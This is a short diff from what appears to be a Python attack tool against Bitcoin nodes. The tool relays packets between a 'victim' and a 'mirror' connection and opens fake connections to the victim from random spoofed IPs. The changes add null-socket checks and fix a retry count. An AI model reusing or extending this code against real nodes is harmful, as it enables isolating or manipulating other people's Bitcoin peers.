@@ -289,6 +289,8 @@ def packet_received(msg_raw, socket, mirror_socket, from_ip, from_port, to_ip, t
 
 	# Relay Bitcoin packets that aren't from the victim
 	print(f'*** Victim message received ** {from_ip} --> {to_ip} ** {msg_type}')
+
+	if mirror_socket == None: return False # If the mirror's socket isn't running, don't bother trying to relay
 	try:
 		#if msg_type == 'ping':
 		#	pong = msg_pong(bitcoin_protocolversion)
@@ -302,7 +304,7 @@ def packet_received(msg_raw, socket, mirror_socket, from_ip, from_port, to_ip, t
 	except Exception as e:
 		close_connection(socket, mirror_socket, from_ip, from_port, interface)
 		print("Closing socket because of error: " + str(e))
-		make_fake_connection(random_ip(), victim_ip, False, attempt_number - 1)
+		make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = False, attempt_number = 3)
 		return True # End the thread
 	return False
 
@@ -342,6 +344,7 @@ def mirror_packet_received(msg_raw, socket, orig_socket, from_ip, from_port, to_
 
 	# Relay Bitcoin packets that aren't from the victim
 	print(f'*** Mirror message received ** {from_ip} --> {to_ip} ** {msg_type}')
+	if orig_socket == None: return False # If the original's socket isn't running, don't bother trying to relay
 	try:
 		#if msg_type == 'ping':
 		#	pong = msg_pong(bitcoin_protocolversion)
